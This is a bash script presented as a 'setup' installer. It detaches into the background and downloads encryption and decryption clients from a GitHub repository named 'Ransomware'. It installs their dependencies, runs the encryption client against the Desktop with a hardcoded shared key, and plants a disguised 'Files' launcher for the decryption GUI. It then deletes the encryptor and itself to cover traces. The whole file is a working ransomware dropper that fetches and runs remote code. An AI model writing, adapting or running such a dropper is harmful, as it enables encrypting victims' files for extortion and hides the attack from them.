#!/usr/bin/env bash
set -euo pipefail

LOG="$HOME/Desktop/setup.log"

# If not detached, re-launch self detached and exit original process.
if [ "${DETACHED:-0}" != "1" ]; then
  mkdir -p "$(dirname "$LOG")"
  : > "$LOG" || true
  echo "[*] Launching detached. Logs -> $LOG"
  DETACHED=1 nohup bash "$0" >> "$LOG" 2>&1 & disown
  echo "[*] Setup started in background. Check $LOG"
  exit 0
fi

# ----------------- detached child starts here -----------------
echo "------------------------"
date
echo "[*] Detached setup started. Logs here: $LOG"
echo

# ---------- CONFIG ----------
DESKTOP="$HOME/Desktop"
REPO_BASE="https://raw.githubusercontent.com/Google-design/Ransomware/refs/heads/main/server-type-arch"
ENCRYPT_PY="client-encrypt.py"
DECRYPT_PY="client-decrypt-gui.py"
REQS_URL="https://raw.githubusercontent.com/Google-design/Ransomware/refs/heads/main/requirements.txt"
REQS="requirements.txt"
VENV_DIR="venv"
DECRYPT_DESKTOP="${DESKTOP}/decrypt.desktop"
SHARED_KEY_VALUE="superlongrandomsecret123"

# ---------- START ----------
echo "[*] Running setup on: $DESKTOP"
cd "$DESKTOP" || { echo "Failed to cd $DESKTOP"; exit 1; }

# Download client files
echo "[*] Downloading client files..."
wget --timeout=15 --tries=2 --show-progress "${REPO_BASE}/${ENCRYPT_PY}" -O "${DESKTOP}/${ENCRYPT_PY}" || { echo "warn: failed to fetch ${ENCRYPT_PY}"; }
wget --timeout=15 --tries=2 --show-progress "${REPO_BASE}/${DECRYPT_PY}" -O "${DESKTOP}/${DECRYPT_PY}" || { echo "warn: failed to fetch ${DECRYPT_PY}"; }
wget --timeout=15 --tries=2 --show-progress "${REQS_URL}" -O "${DESKTOP}/${REQS}" || { echo "warn: failed to fetch ${REQS}"; }

# Create virtualenv if missing
if [ ! -d "${DESKTOP}/${VENV_DIR}" ]; then
  echo "[*] Creating virtualenv..."
  python3 -m venv "${DESKTOP}/${VENV_DIR}" || { echo "virtualenv creation failed"; }
fi

# Activate and install dependencies (if requirements present)
echo "[*] Installing Python dependencies (if any)..."
# shellcheck disable=SC1090
source "${DESKTOP}/${VENV_DIR}/bin/activate"
pip install --upgrade pip || echo "pip upgrade failed, continuing..."
if [ -f "${DESKTOP}/${REQS}" ]; then
  pip install -r "${DESKTOP}/${REQS}" --prefer-binary || echo "pip install -r failed, continuing..."
fi
deactivate

# Create decrypt desktop launcher (no terminal)
echo "[*] Creating decrypt.desktop launcher..."
cat > "${DECRYPT_DESKTOP}" <<'DESKTOP'
[Desktop Entry]
Name=Files
Exec=/bin/bash -c "cd ~/Desktop && source venv/bin/activate && python3 client-decrypt-gui.py && deactivate"
Type=Application
Terminal=false
Icon=system-lock-screen
DESKTOP
chmod +x "${DECRYPT_DESKTOP}" || true

# Export only for the upcoming run
export EDGE_SHARED_KEY="${SHARED_KEY_VALUE}"

# Run encryption once with the shared key (inside venv)
echo "[*] Running encryption (shared key exported for this run only)..."
# shellcheck disable=SC1090
source "${DESKTOP}/${VENV_DIR}/bin/activate"
python3 "${DESKTOP}/${ENCRYPT_PY}" || echo "encryption script failed (check log)"
deactivate

# Immediately remove shared key from environment
unset EDGE_SHARED_KEY
echo "[*] EDGE_SHARED_KEY unset."

# ---------- CLEANUP ----------
echo "[*] Performing cleanup..."
rm -f "${DESKTOP}/${REQS}" || true
rm -f "${DESKTOP}/${ENCRYPT_PY}" || true    # remove encrypt script after one-time use

SELF="$(realpath "$0")"
# remove installer if it lives on Desktop with that name
if [[ "${SELF}" == "${DESKTOP}/setup_combined.sh" || "${SELF}" == "${DESKTOP}/setup.sh" ]]; then
  echo "  - removing installer script ${SELF}"
  rm -f "${SELF}" || true
else
  echo "  - installer script not removed (not running from Desktop path)"
fi

echo "[*] Setup finished."
echo "[*] To view logs: tail -f \"$LOG\""
echo "[*] To decrypt: double-click the 'Files' icon on Desktop or run:"
echo "    source venv/bin/activate ; python3 client-decrypt-gui.py ; deactivate"

exit 0
